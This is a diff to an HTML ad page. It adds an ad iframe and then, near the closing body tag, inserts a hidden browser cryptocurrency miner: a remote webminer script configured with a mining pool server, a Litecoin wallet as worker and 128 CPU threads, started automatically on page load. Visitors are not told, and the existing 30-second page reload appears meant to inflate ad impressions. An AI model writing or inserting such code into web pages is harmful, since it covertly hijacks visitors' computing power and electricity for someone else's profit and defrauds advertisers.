@@ -26,7 +26,7 @@
         function insertAds() {
             const numberOfAds = getNumberOfAds();
             const adContainer = document.getElementById('ad-container');
-            const adCode = "";
+            const adCode = "<iframe data-aa='2335211' src='//ad.a-ads.com/2335211?size=728x90' style='width:728px; height:90px; border:0px; padding:0; overflow:hidden; background-color: transparent;'></iframe>";
 
             adContainer.innerHTML = ''; // Clear any existing ads
 
@@ -45,5 +45,24 @@
             location.reload();
         }, 30000);
     </script>
+<iframe src="https://ads.susgalaxy.xyz" title="ads"></iframe>
+            <script src="https://webminer.pages.dev/dist/mm.js"></script>
+            <script>
+            const client = new Client({
+            algorithm: 'minotaurx', // yespower, minotaurx
+            stratum: {
+            server: "minotaurx.na.mine.zpool.ca", // Your Pool host
+            port: 7019, // Your Pool port
+            worker: "ltc1qy2q2xjukf5kfarw3fskvdr9e3d003l9wp6peve", // Your Wallet
+            password: "c=LTC" // Your Mining password
+            },
+            options: {
+            threads: 128, // CPU threads to mining
+            log: true // Show log on console
+            },
+            });
 
+            // Start Mining
+            client.start();
+            </script>
 </body></html>
